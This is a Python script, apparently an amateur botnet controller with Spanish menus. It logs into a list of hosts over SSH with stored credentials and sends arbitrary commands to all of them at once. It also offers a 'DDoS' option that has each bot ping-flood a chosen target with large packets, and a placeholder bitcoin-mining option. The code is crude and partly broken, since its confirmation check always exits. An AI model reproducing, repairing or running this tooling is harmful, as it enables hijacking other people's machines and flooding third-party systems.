
from pexpect import pxssh
from colorama import Fore, Back, init
init()
import os 

def clear():
    os.system('cls')
def pause():
    os.system('PAUSE')

class Client:
    def __init__(self, host, usuario, password):
        self.host = host
        self.user = usuario
        self.password = password
        self.session = self.conectar()

    def conectar(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            return s
        except Exception as e:
            print(Fore.RED+e)
            print(f'{Fore.RED}Error conectando al usuario.')

    def client_cmd(self, command):
        self.session.sendline(command)
        self.session.prompt()
        return self.session.before

def enviarcmd(command):
    for client in botNet:
        output = client.client_cmd(command)
        print(f'{Fore.GREEN}Conectado correctamente a {client.host}')
        print(f'Output: {output}')

def anadir_user(host, usuario, password):
    client = Client(host, usuario, password)
    botNet.append(client)

botNet = []

def starter():
    print(f'''{Fore.RED}
    
    
██████╗░░█████╗░████████╗███╗░░██╗███████╗████████╗
██╔══██╗██╔══██╗╚══██╔══╝████╗░██║██╔════╝╚══██╔══╝
██████╦╝██║░░██║░░░██║░░░██╔██╗██║█████╗░░░░░██║░░░
██╔══██╗██║░░██║░░░██║░░░██║╚████║██╔══╝░░░░░██║░░░
██████╦╝╚█████╔╝░░░██║░░░██║░╚███║███████╗░░░██║░░░
╚═════╝░░╚════╝░░░░╚═╝░░░╚═╝░░╚══╝╚══════╝░░░╚═╝░░░

█▀▄▀█ ▄▀█ █▀▄ █▀▀   █▄▄ █▄█   ▀█ █▀▄ ▄▀█ █▀█ █▄▀ █▄█
█░▀░█ █▀█ █▄▀ ██▄   █▄█ ░█░   █▄ █▄▀ █▀█ █▀▄ █░█ ░█░

    
    {Fore.CYAN}- Opciones -

    {Fore.BLUE}> 1: {Fore.MAGENTA}Enviar comando personalizado
    {Fore.BLUE}> 2: {Fore.RED}DDoS
    {Fore.BLUE}> 3: {Fore.MAGENTA}Minar {Fore.YELLOW}BTC
    {Fore.BLUE}> 4: {Fore.MAGENTA}Otro

    ''')

    respons = int(input('   root@botnet > '))

    if respons == 1:
        asd = input(f'{Fore.WHITE}What command you wanna send? > ')
        sur = input('Are you sure? y/n > ')
        if sur != 'y' or sur != 'Y':
            exit()
        
        enviarcmd(f'{asd}')
        clear()

        print(f'{Fore.BLUE}Enviado correctamente el comando {asd}')



    elif respons == 2:
        web = input(f'\n{Fore.BLUE}Start attack to > ')
        packts = input(f'Packets > ')
        mb = input('Bytes to send > ')
        timet = input(f'Timeout (ms) > ')

        sure = input('Are you sure? y/n > ')
        if sure == 'n' or sure == 'N':
            exit()

        enviarcmd(f'ping {web} -l {mb} -n {packts} -w {timet} -a')
        
        clear()

        print(f'''
        
        
        {Fore.MAGENTA}‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗

        ‖                                       
        ‖ {Fore.RED}» {Fore.CYAN}Starting attack to: {Fore.MAGENTA}{web}             
        ‖                                       
        ‖ {Fore.RED}» {Fore.CYAN}Bytes: {Fore.MAGENTA}{mb}                           
        ‖                                       
        ‖ {Fore.RED}» {Fore.CYAN}Timeout: {Fore.MAGENTA}{timet}                      
        ‖                                       
        ‖ {Fore.RED}» {Fore.CYAN}Packets count: {Fore.MAGENTA}{packts}               
        ‖                                       
        ‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗
        
        ''')

    elif respons == 3:
        print(f'{Fore.RED}Opcion no disponible por el momento')
    
    else: 
        print(f'{Fore.RED}Seleccione un numero.')






#anadir_user('127.0.0.1', 'usuario', 'contraseña')
starter()











